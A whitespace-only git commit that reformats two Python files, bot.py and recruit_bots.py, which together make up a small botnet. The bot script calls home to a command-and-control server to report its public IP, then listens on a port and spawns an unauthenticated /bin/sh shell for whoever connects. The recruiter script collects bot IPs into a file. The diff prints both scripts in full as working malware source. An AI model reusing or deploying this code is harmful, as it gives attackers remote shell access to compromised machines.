7dbb7fdaf841a12f2180414d22261ccbf3976175
pwilthew <patywilthew@gmail.com>
2018-10-18 00:50:15 -0400

    Replaced tabs with spaces

--- bot.py
+++ bot.py
@@ -8,26 +8,26 @@ PORT = 11111
 MY_IP = urlopen('http://ip.42.pl/raw').read()
 
 def main():
-	"""Receive and execute commands from C2."""
-	call_home(C2, PORT)
+    """Receive and execute commands from C2."""
+    call_home(C2, PORT)
 
-	while True:
-		l = listen(PORT)
-		l.wait_for_connection()
-		l.spawn_process('/bin/sh')
+    while True:
+        l = listen(PORT)
+        l.wait_for_connection()
+        l.spawn_process('/bin/sh')
 
 
 def call_home(ip, port):
-	"""Send this host's IP address to the C2 server.
+    """Send this host's IP address to the C2 server.
 
-	Args:
-		ip (str): C2's IP address.
-		port (int): C2's listening port.
-	"""
-	r = remote(C2, port)
-	home_response = r.recvline() # Hi, what's your IP?
-	r.sendline(MY_IP)
+    Args:
+        ip (str): C2's IP address.
+        port (int): C2's listening port.
+    """
+    r = remote(C2, port)
+    home_response = r.recvline() # Hi, what's your IP?
+    r.sendline(MY_IP)
 
 
 if __name__ == "__main__":
-	main()
+    main()
--- recruit_bots.py
+++ recruit_bots.py
@@ -13,52 +13,52 @@ LPORT = 11111
 
 
 def main():
-	"""Write bots' IP addresses to the BOTS_IPS file.
+    """Write bots' IP addresses to the BOTS_IPS file.
 
-	Wait for bots to connect and send their IP addresses,
-	then write them to the file.
-	"""
-	while True:
-		# Wait for a bot to connect.
-		l = listen(LPORT)
-		_ = l.wait_for_connection()
+    Wait for bots to connect and send their IP addresses,
+    then write them to the file.
+    """
+    while True:
+        # Wait for a bot to connect.
+        l = listen(LPORT)
+        _ = l.wait_for_connection()
 
-		# Ask for its IP address.
-		l.sendline('Hi, what\'s your IP?')
-		ip = l.recvline().strip('\n')
+        # Ask for its IP address.
+        l.sendline('Hi, what\'s your IP?')
+        ip = l.recvline().strip('\n')
 
-		if not is_ip_valid(ip):
-			continue
+        if not is_ip_valid(ip):
+            continue
 
-		# Get the current bots' IP addresses from the file
-		# and store them in a set.
-		with open(BOTS_IPS, 'r') as bots_file:
-			set_of_bots_ips = set(x for x in bots_file.readlines())
+        # Get the current bots' IP addresses from the file
+        # and store them in a set.
+        with open(BOTS_IPS, 'r') as bots_file:
+            set_of_bots_ips = set(x for x in bots_file.readlines())
 
-		# Add the new bot IP address to the set.
-		set_of_bots_ips.add(ip)
+        # Add the new bot IP address to the set.
+        set_of_bots_ips.add(ip)
 
-		# Overwrite the file with the new set to avoid
-		# duplicate IP addresses.
-		with open(BOTS_IPS, 'w') as bots_file:
-			bots_file.write('\n'.join(set_of_bots_ips))
+        # Overwrite the file with the new set to avoid
+        # duplicate IP addresses.
+        with open(BOTS_IPS, 'w') as bots_file:
+            bots_file.write('\n'.join(set_of_bots_ips))
 
 
 def is_ip_valid(ip):
-	"""Determine if a string `ip` is a valid IP.
+    """Determine if a string `ip` is a valid IP.
 
-	Args:
-		ip (str): A possible IP address.
+    Args:
+        ip (str): A possible IP address.
 
-	Returns:
-		bool: True is `ip` is a valid IP address.
-	"""
-	try:
-		ipaddress.ip_address(unicode(ip))
-	except:
-		return False
-	return True
+    Returns:
+        bool: True is `ip` is a valid IP address.
+    """
+    try:
+        ipaddress.ip_address(unicode(ip))
+    except:
+        return False
+    return True
 
 
 if __name__ == '__main__':
-	main()
+    main()
